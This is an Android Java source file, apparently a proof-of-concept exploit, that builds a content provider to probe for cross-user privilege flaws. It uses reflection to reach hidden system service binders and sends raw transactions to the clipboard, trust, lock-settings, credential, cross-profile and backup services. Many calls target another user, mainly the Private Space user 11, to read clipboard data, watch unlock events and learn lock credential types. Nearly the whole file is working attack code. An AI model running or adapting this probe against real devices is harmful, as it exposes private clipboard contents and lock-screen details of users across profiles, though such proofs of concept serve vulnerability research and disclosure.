package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class HighValueProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("clipboard")) {
            probeClipboard(cursor);
        } else if (path != null && path.contains("crossprofile")) {
            probeCrossProfile(cursor);
        } else if (path != null && path.contains("credential")) {
            probeCredential(cursor);
        } else if (path != null && path.contains("trust")) {
            probeTrust(cursor);
        } else if (path != null && path.contains("locksettings")) {
            probeLockSettings(cursor);
        } else if (path != null && path.contains("backup")) {
            probeBackup(cursor);
        } else {
            probeClipboard(cursor);
            probeCrossProfile(cursor);
            probeCredential(cursor);
            probeTrust(cursor);
            probeLockSettings(cursor);
            probeBackup(cursor);
        }

        return cursor;
    }

    private void probeClipboard(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("clipboard");
        if (binder == null) { cursor.addRow(new Object[]{"clipboard", "no_binder"}); return; }
        String desc = "android.content.IClipboard";

        // IClipboard methods:
        // TX=1: setPrimaryClip(ClipData, String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=2: clearPrimaryClip(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=3: getPrimaryClip(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=4: getPrimaryClipDescription(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=5: hasPrimaryClip(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=6: addPrimaryClipChangedListener(...)
        // TX=7: removePrimaryClipChangedListener(...)
        // TX=8: hasClipboardText(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=9: getPrimaryClipSource(String callingPackage, String attributionTag, int userId, int deviceId)
        // TX=10: areNotificationsEnabledForClip(int userId)

        // Try to get Primary Clip as USER 0 (current)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName()); // callingPackage
            data.writeString(null); // attributionTag
            data.writeInt(0); // userId 0
            data.writeInt(0); // deviceId
            binder.transact(3, data, reply, 0);
            reply.readException();
            if (reply.readInt() != 0) {
                // ClipData parcelable present
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"clip_user0", "HAS_DATA avail=" + avail});
                try {
                    // Try to read clip description
                    // ClipDescription: mimeTypes array, label
                    int mimeCount = reply.readInt();
                    if (mimeCount > 0 && mimeCount < 100) {
                        String mime = reply.readString();
                        cursor.addRow(new Object[]{"clip_user0_mime", mime + " (types=" + mimeCount + ")"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"clip_user0_parse", "avail=" + avail});
                }
            } else {
                cursor.addRow(new Object[]{"clip_user0", "NULL(empty)"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clip_user0", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // KEY TEST: Try to get clipboard for Private Space (user 11)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(11); // Private Space user!
            data.writeInt(0);
            binder.transact(3, data, reply, 0);
            reply.readException();
            if (reply.readInt() != 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"clip_user11", "HAS_DATA! avail=" + avail + " PRIVATE_SPACE_LEAK!"});
            } else {
                cursor.addRow(new Object[]{"clip_user11", "NULL(empty or blocked)"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clip_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Try hasPrimaryClip for user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(11);
            data.writeInt(0);
            binder.transact(5, data, reply, 0);
            reply.readException();
            boolean has = reply.readInt() != 0;
            cursor.addRow(new Object[]{"hasClip_user11", String.valueOf(has)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"hasClip_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Try hasClipboardText for user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(11);
            data.writeInt(0);
            binder.transact(8, data, reply, 0);
            reply.readException();
            boolean has = reply.readInt() != 0;
            cursor.addRow(new Object[]{"hasText_user11", String.valueOf(has)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"hasText_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=9: getPrimaryClipSource for user 11 (reveals which app copied)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(11);
            data.writeInt(0);
            binder.transact(9, data, reply, 0);
            reply.readException();
            String source = reply.readString();
            cursor.addRow(new Object[]{"clipSource_user11", source != null ? source : "null"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipSource_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=10: areNotificationsEnabledForClip(int userId) — no package check?
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(11);
            binder.transact(10, data, reply, 0);
            reply.readException();
            boolean enabled = reply.readInt() != 0;
            cursor.addRow(new Object[]{"clipNotif_user11", String.valueOf(enabled)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipNotif_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Try clipboard for user 10 (managed profile?)
        for (int uid : new int[]{10, 100, 999}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(uid);
                data.writeInt(0);
                binder.transact(5, data, reply, 0);
                reply.readException();
                boolean has = reply.readInt() != 0;
                cursor.addRow(new Object[]{"hasClip_user" + uid, String.valueOf(has)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"hasClip_user" + uid, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Register clipboard listener for user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new Binder()); // IOnPrimaryClipChangedListener
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(11);
            data.writeInt(0);
            binder.transact(6, data, reply, 0);
            reply.readException();
            cursor.addRow(new Object[]{"clipListener_user11", "REGISTERED!"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipListener_user11", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeCrossProfile(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("crossprofileapps");
        if (binder == null) { cursor.addRow(new Object[]{"crossprofile", "no_binder"}); return; }
        String desc = "android.content.pm.ICrossProfileApps";

        // ICrossProfileApps methods:
        // TX=1: getTargetUserProfiles(String callingPackage)
        // TX=2: startActivityAsUser(...)
        // TX=3: startActivityAsUserByIntent(...)
        // TX=4: canInteractAcrossProfiles(String callingPackage)
        // TX=5: canRequestInteractAcrossProfiles(String callingPackage)
        // TX=6: getInteractAcrossProfilesAppOp(String callingPackage)

        // TX=1: getTargetUserProfiles — reveals other profiles/users
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(1, data, reply, 0);
            reply.readException();
            // Returns List<UserHandle>
            int count = reply.readInt();
            cursor.addRow(new Object[]{"targetProfiles", "count=" + count});
            for (int i = 0; i < Math.min(count, 10); i++) {
                if (reply.readInt() != 0) {
                    int userId = reply.readInt();
                    cursor.addRow(new Object[]{"profile_" + i, "userId=" + userId});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"targetProfiles", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=4: canInteractAcrossProfiles
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(4, data, reply, 0);
            reply.readException();
            boolean can = reply.readInt() != 0;
            cursor.addRow(new Object[]{"canInteract", String.valueOf(can)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"canInteract", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeCredential(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("credential");
        if (binder == null) { cursor.addRow(new Object[]{"credential", "no_binder"}); return; }
        String desc = "android.credentials.ICredentialManager";

        // Quick TX scan to find accessible methods
        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    int avail = reply.dataAvail();
                    try {
                        reply.readException();
                        cursor.addRow(new Object[]{"cred_tx" + tx, "OK avail=" + reply.dataAvail()});
                    } catch (Exception e) {
                        cursor.addRow(new Object[]{"cred_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    }
                } else {
                    cursor.addRow(new Object[]{"cred_tx" + tx, "NO_IMPL"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cred_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeTrust(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("trust");
        if (binder == null) { cursor.addRow(new Object[]{"trust", "no_binder"}); return; }
        String desc = "android.app.trust.ITrustManager";

        // ITrustManager:
        // TX=1: reportUnlockAttempt(boolean successful, int userId)
        // TX=2: reportUnlockLockout(int timeoutMs, int userId)
        // TX=3: reportEnabledTrustAgentsChanged(int userId)
        // TX=4: registerTrustListener(ITrustListener)
        // TX=5: unregisterTrustListener(ITrustListener)
        // TX=6: reportKeyguardShowingChanged()
        // TX=7: isDeviceLocked(int userId, int deviceId)
        // TX=8: isDeviceSecure(int userId, int deviceId)
        // TX=9: isTrustUsuallyManaged(int userId)

        // TX=7: isDeviceLocked — leaks lock state per user
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0); // deviceId
                binder.transact(7, data, reply, 0);
                reply.readException();
                boolean locked = reply.readInt() != 0;
                cursor.addRow(new Object[]{"isLocked_user" + userId, String.valueOf(locked)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"isLocked_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=8: isDeviceSecure — whether PIN/password/pattern is set
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0);
                binder.transact(8, data, reply, 0);
                reply.readException();
                boolean secure = reply.readInt() != 0;
                cursor.addRow(new Object[]{"isSecure_user" + userId, String.valueOf(secure)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"isSecure_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=9: isTrustUsuallyManaged
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(9, data, reply, 0);
                reply.readException();
                boolean managed = reply.readInt() != 0;
                cursor.addRow(new Object[]{"trustManaged_user" + userId, String.valueOf(managed)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"trustManaged_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=4: registerTrustListener — monitor unlock events
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(new Binder()); // ITrustListener
            binder.transact(4, data, reply, 0);
            reply.readException();
            cursor.addRow(new Object[]{"trustListener", "REGISTERED!"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"trustListener", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeLockSettings(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("lock_settings");
        if (binder == null) { cursor.addRow(new Object[]{"lock_settings", "no_binder"}); return; }
        String desc = "com.android.internal.widget.ILockSettings";

        // ILockSettings is very sensitive — let's probe carefully
        // TX=6: havePassword(int userId) — boolean leak
        // TX=7: havePattern(int userId) — boolean leak
        // TX=14: getCredentialType(int userId) — credential type leak

        for (int userId : new int[]{0, 11}) {
            // havePassword
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(6, data, reply, 0);
                reply.readException();
                boolean has = reply.readInt() != 0;
                cursor.addRow(new Object[]{"hasPassword_user" + userId, String.valueOf(has)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"hasPassword_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();

            // havePattern
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(7, data, reply, 0);
                reply.readException();
                boolean has = reply.readInt() != 0;
                cursor.addRow(new Object[]{"hasPattern_user" + userId, String.valueOf(has)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"hasPattern_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // getCredentialType
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(14, data, reply, 0);
                reply.readException();
                int type = reply.readInt();
                // -1=NONE, 1=PATTERN, 2=PIN, 3=PASSWORD
                String typeName;
                switch (type) {
                    case -1: typeName = "NONE"; break;
                    case 1: typeName = "PATTERN"; break;
                    case 2: typeName = "PIN"; break;
                    case 3: typeName = "PASSWORD"; break;
                    default: typeName = "UNKNOWN(" + type + ")"; break;
                }
                cursor.addRow(new Object[]{"credType_user" + userId, typeName});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"credType_user" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=3: getBoolean(String key, boolean defaultValue, int userId)
        // Might leak system settings
        String[] keys = {"lockscreen.disabled", "lockscreen.password_type",
            "lockscreen.password_type_alternate", "lock_pattern_autolock",
            "lockscreen.power_button_instantly_locks"};
        for (String key : keys) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(key);
                data.writeInt(0); // default
                data.writeInt(0); // userId
                binder.transact(3, data, reply, 0);
                reply.readException();
                boolean val = reply.readInt() != 0;
                cursor.addRow(new Object[]{"lock_" + key.replace("lockscreen.", ""), String.valueOf(val)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"lock_" + key.replace("lockscreen.", ""), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Try getLong for password type (reveals credential type numerically)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("lockscreen.password_type");
            data.writeLong(0); // default
            data.writeInt(11); // Private Space userId
            binder.transact(4, data, reply, 0); // TX=4: getLong
            reply.readException();
            long val = reply.readLong();
            cursor.addRow(new Object[]{"pwdType_user11", String.valueOf(val)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"pwdType_user11", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeBackup(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("backup");
        if (binder == null) { cursor.addRow(new Object[]{"backup", "no_binder"}); return; }
        String desc = "android.app.backup.IBackupManager";

        // TX scan for accessible methods
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        cursor.addRow(new Object[]{"backup_tx" + tx, "OK avail=" + reply.dataAvail()});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && (msg.contains("Permission") || msg.contains("Security"))) {
                            cursor.addRow(new Object[]{"backup_tx" + tx, "DENIED:" + truncate(msg)});
                        } else {
                            cursor.addRow(new Object[]{"backup_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"backup_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
